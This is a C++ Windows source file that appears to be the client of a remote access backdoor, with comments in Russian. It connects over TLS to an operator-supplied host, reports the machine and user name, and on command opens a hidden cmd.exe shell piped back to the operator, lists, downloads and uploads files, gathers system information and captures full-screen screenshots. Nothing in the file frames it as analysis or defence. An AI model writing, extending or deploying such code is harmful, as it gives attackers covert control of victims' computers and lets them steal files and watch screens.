#include "../common/proto.h"
#include "../common/tls.h"
#include <string>
#include <cstdio>

static TlsCtx* g_tls = nullptr;
static volatile LONG g_run = 1;
static HANDLE g_hShellInW = nullptr, g_hShellOutR = nullptr, g_hShellProc = nullptr;
static CRITICAL_SECTION g_cs;

static DWORD WINAPI ShellReader(LPVOID) {
  char buf[4096]; DWORD n;
  HANDLE out = g_hShellOutR;
  while (ReadFile(out, buf, sizeof(buf), &n, nullptr)) {
    if (n == 0) break;
    EnterCriticalSection(&g_cs);
    if (g_tls && g_run) TlsSendMsg(*g_tls, C_SHELL_DATA, buf, (uint32_t)n);
    LeaveCriticalSection(&g_cs);
  }
  EnterCriticalSection(&g_cs);
  if (g_tls && g_run) TlsSendMsg(*g_tls, C_SHELL_CLOSE, "", 0);
  LeaveCriticalSection(&g_cs);
  return 0;
}

static void ShellStart() {
  SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
  HANDLE inR, inW, outR, outW;
  if (!CreatePipe(&inR, &inW, &sa, 0) || !CreatePipe(&outR, &outW, &sa, 0)) return;
  SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
  STARTUPINFOA si{}; si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
  PROCESS_INFORMATION pi{};
  // Запускаем cmd и сразу ставим UTF-8
  if (!CreateProcessA(nullptr, (LPSTR)"cmd.exe /Q /K chcp 65001 > nul", nullptr, nullptr, TRUE,
                      CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
    CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW);
    return;
  }
  g_hShellInW = inW; g_hShellOutR = outR; g_hShellProc = pi.hProcess;
  CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
  CreateThread(nullptr, 0, ShellReader, nullptr, 0, nullptr);
}

static void ShellStop() {
  if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = nullptr; }
  if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = nullptr; }
  if (g_hShellOutR) { CloseHandle(g_hShellOutR); g_hShellOutR = nullptr; }
}

static std::string FsList(const std::string& path) {
  std::string glob = path;
  if (glob.empty()) glob = "C:\\";
  if (glob.back() != '\\' && glob.back() != '/') glob += "\\*";
  else glob += "*";
  WIN32_FIND_DATAA fd; std::string out;
  HANDLE h = FindFirstFileA(glob.c_str(), &fd);
  if (h == INVALID_HANDLE_VALUE) return "ERR|" + std::to_string(GetLastError()) + "\n";
  do {
    uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
    out += fd.cFileName; out += '|'; out += std::to_string(sz); out += '|';
    out += (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d\n" : "f\n";
  } while (FindNextFileA(h, &fd));
  FindClose(h);
  return out;
}

static std::string SysInfo() {
  char host[256] = {}, user[256] = {}, dir[MAX_PATH] = {};
  DWORD n = sizeof(host); GetComputerNameA(host, &n);
  n = sizeof(user); GetUserNameA(user, &n);
  GetCurrentDirectoryA(sizeof(dir), dir);
  MEMORYSTATUSEX ms{ sizeof(ms) }; GlobalMemoryStatusEx(&ms);
  char windir[MAX_PATH] = {}; GetWindowsDirectoryA(windir, sizeof(windir));
  std::string s;
  s += "host:    "; s += host; s += "\nuser:    "; s += user;
  s += "\nwindir:  "; s += windir; s += "\ncwd:     "; s += dir;
  s += "\nram:     "; s += std::to_string(ms.ullTotalPhys / (1024 * 1024)); s += " MB total, ";
  s += std::to_string(ms.ullAvailPhys / (1024 * 1024)); s += " MB free";
  ULARGE_INTEGER fr, tot, freeBytes;
  GetDiskFreeSpaceExA("C:\\", &fr, &tot, &freeBytes);
  s += "\ndisk C: "; s += std::to_string(tot.QuadPart / (1024 * 1024 * 1024)); s += " GB total, ";
  s += std::to_string(fr.QuadPart / (1024 * 1024 * 1024)); s += " GB free";
  s += "\npid:     "; s += std::to_string(GetCurrentProcessId()); s += "\n";
  return s;
}

static std::string Screenshot() {
  int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
  int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
  HDC scr = GetDC(nullptr), mem = CreateCompatibleDC(scr);
  HBITMAP bm = CreateCompatibleBitmap(scr, vw, vh);
  SelectObject(mem, bm);
  BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT);
  BITMAPINFO bi{}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
  bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
  int rowBytes = ((vw * 3 + 3) & ~3);
  DWORD px = (DWORD)rowBytes * vh;
  std::string pixels(px, 0);
  GetDIBits(mem, bm, 0, vh, (void*)pixels.data(), &bi, DIB_RGB_COLORS);
  BITMAPFILEHEADER fh{};
  fh.bfType = 'B' | ('M' << 8);
  fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER);
  fh.bfSize = fh.bfOffBits + px;
  std::string out;
  out.append((char*)&fh, sizeof(fh));
  out.append((char*)&bi.bmiHeader, sizeof(BITMAPINFOHEADER));
  out += pixels;
  DeleteObject(bm); DeleteDC(mem); ReleaseDC(nullptr, scr);
  return out;
}

static std::string ReadFileAll(const std::string& p, bool& ok) {
  HANDLE f = CreateFileA(p.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
  std::string s;
  if (f == INVALID_HANDLE_VALUE) { ok = false; return s; }
  char buf[65536]; DWORD n;
  while (ReadFile(f, buf, sizeof(buf), &n, nullptr) && n) s.append(buf, n);
  CloseHandle(f); ok = true; return s;
}

static bool WriteFileAll(const std::string& p, const std::string& d) {
  HANDLE f = CreateFileA(p.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
  if (f == INVALID_HANDLE_VALUE) return false;
  DWORD n; BOOL ok = TRUE; size_t off = 0;
  while (ok && off < d.size()) {
    uint32_t chunk = (uint32_t)(d.size() - off < (1u << 20) ? d.size() - off : (1u << 20));
    ok = WriteFile(f, d.data() + off, chunk, &n, nullptr);
    off += chunk;
  }
  CloseHandle(f); return ok != FALSE;
}

static DWORD WINAPI Worker(LPVOID param) {
  const char* addr = (const char*)param;
  char host[512]; int port = 8443;
  char* colon = strchr((char*)addr, ':');
  if (colon) { *colon = 0; port = atoi(colon + 1); }
  strcpy(host, addr);

  struct addrinfo* ai = nullptr;
  getaddrinfo(host, std::to_string(port).c_str(), nullptr, &ai);
  SOCKET s = INVALID_SOCKET;
  for (auto p = ai; p; p = p->ai_next) {
    s = socket(p->ai_family, SOCK_STREAM, 0);
    if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
    closesocket(s); s = INVALID_SOCKET;
  }
  freeaddrinfo(ai);
  if (s == INVALID_SOCKET) return 0;

  TlsCtx* t = new TlsCtx(); t->sock = s;
  if (!TlsAcquire(*t, nullptr) || !TlsHandshake(*t)) {
    delete t; closesocket(s); return 0;
  }
  EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);

  char hbuf[256] = {}, ubuf[256] = {}; DWORD n = sizeof(hbuf);
  GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
  std::string hello = std::string(hbuf) + "|" + ubuf + "|Windows";
  TlsSendMsg(*t, C_HELLO, hello.data(), (uint32_t)hello.size());

  uint16_t cmd; std::string pl;
  for (;;) {
    if (!TlsRecvMsg(*t, cmd, pl)) break;
    switch (cmd) {
      case C_SHELL_START: ShellStart(); break;
      case C_SHELL_CLOSE: ShellStop(); break;
      case C_SHELL_DATA:
        if (g_hShellInW) { DWORD w; WriteFile(g_hShellInW, pl.data(), (DWORD)pl.size(), &w, nullptr); }
        break;
      case C_FS_LIST: {
        std::string r = FsList(pl);
        TlsSendMsg(*t, C_FS_LIST_RESP, r.data(), (uint32_t)r.size()); break;
      }
      case C_FS_GET: {
        bool ok; std::string d = ReadFileAll(pl, ok);
        TlsSendMsg(*t, C_FS_FILE, ok ? d.data() : "", ok ? (uint32_t)d.size() : 0); break;
      }
      case C_FS_PUT: {
        size_t nl = pl.find('\n');
        if (nl != std::string::npos) WriteFileAll(pl.substr(0, nl), pl.substr(nl + 1));
        break;
      }
      case C_SYSINFO: {
        std::string r = SysInfo();
        TlsSendMsg(*t, C_SYSINFO, r.data(), (uint32_t)r.size()); break;
      }
      case C_SCREEN: {
        std::string bmp = Screenshot();
        TlsSendMsg(*t, C_SCREEN_IMG, bmp.data(), (uint32_t)bmp.size()); break;
      }
      case C_BYE: goto done;
    }
  }
done:
  ShellStop();
  EnterCriticalSection(&g_cs); g_tls = nullptr; LeaveCriticalSection(&g_cs);
  TlsSendMsg(*t, C_BYE, "", 0);
  closesocket(s); delete t;
  return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
  InitializeCriticalSection(&g_cs);
  WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);

  if (!lpCmdLine || !*lpCmdLine) {
    return 0; // Тихо выходим, если нет аргументов
  }

  CreateThread(nullptr, 0, Worker, lpCmdLine, 0, nullptr);

  // Держим процесс живым
  MSG msg;
  while (GetMessageA(&msg, nullptr, 0, 0)) {
    TranslateMessage(&msg); DispatchMessageA(&msg);
  }
  return 0;
}